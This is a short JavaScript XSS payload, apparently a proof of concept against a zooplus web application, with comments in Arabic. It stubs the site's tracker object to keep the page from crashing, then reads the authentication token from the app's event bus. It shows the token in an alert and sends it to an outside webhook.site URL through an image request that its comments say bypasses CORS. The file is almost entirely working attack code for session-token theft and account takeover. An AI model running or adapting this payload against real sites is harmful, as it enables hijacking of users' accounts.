// 1. منع انهيار التطبيق عبر تعريف المصفوفة التي يبحث عنها (Tracker Listener)
window.zooplus = window.zooplus || {};
if (!window.zooplus.tracker) {
    window.zooplus.tracker = {
        listeners: [], // هذا هو المكان الذي كان يحاول التطبيق عمل .map() له
        push: function(e) { console.log("Event captured:", e); }
    };
}

// 2. كود الهجوم لاستخراج التوكن من الـ Event Bus
(function() {
    console.log("🔥 Environment Hijack Successful");

    try {
        const bus = window._async_define_cached_dependencies["events-bus"];
        const events = bus.events || bus._events || [];
        
        // البحث عن التوكن في تاريخ الأحداث
        const authEvent = events.find(e => e.args && e.args[0] === "AUTH-SUCCESS-EVENT-v1");
        
        if (authEvent) {
            const token = authEvent.args[1].token;
            // إظهار التوكن كإثبات (PoC)
            alert("🎯 Account Takeover Proof\nToken: " + token);
            
            // إرساله للـ Webhook (باستخدام Image لتجاوز الـ CORS)
            new Image().src = "https://webhook.site/80fc42ae-6762-46f9-8c4d-46641ae6bafe/leak?t=" + token;
        } else {
            // إذا لم يجد حدث الدخول، يظهر أي دليل على الـ XSS
            alert("XSS Triggered on: " + document.domain);
        }
    } catch (err) {
        console.error("Payload execution error:", err);
    }
})();
